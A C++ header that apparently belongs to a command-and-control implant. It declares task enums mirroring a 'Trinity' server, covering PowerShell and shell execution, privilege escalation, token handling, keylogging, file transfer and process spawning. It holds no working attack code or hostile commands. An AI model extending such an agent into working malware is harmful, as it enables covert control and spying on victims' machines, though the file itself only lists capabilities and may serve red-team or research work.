// ========================================== { START OF FILE } ========================================== //
#pragma once

namespace agent::models {

    /// <summary>
    /// TaskType values. These mirror Trinity.Shared.Enums.Tasks.TaskType on the server and must
    /// stay in step with it; the dispatcher and the command validator both switch on them.
    /// The wire value is an int, so the checkin model keeps an int and the comparisons cast.
    /// </summary>
    enum class TaskType : int {
        Nop = 0,
        Kill = 2,
        Powershell = 3,
        Set = 4,
        Process = 5,
        Download = 6,
        Upload = 7,
        Shell = 8,
        Escalate = 9,
        NetAsm = 10,
        GetUid = 12,
        WinTask = 13,
        Token = 15,
        Keylogger = 16,
    };

    /// <summary>
    /// TaskCode values, mirroring Trinity.Shared.Enums.Tasks.TaskCode.
    /// </summary>
    enum class TaskCode : int {
        NoCode = 0,
        Sleep = 1,
        SpawnTo = 2,
        UpdateHosts = 3,
        Run = 4,
        RunAs = 5,
        RunU = 6,
        KillProcess = 7,
        Download = 8,
        CancelDownload = 9,
    };

}  // namespace agent::models
// ========================================== { END OF FILE } ========================================== //
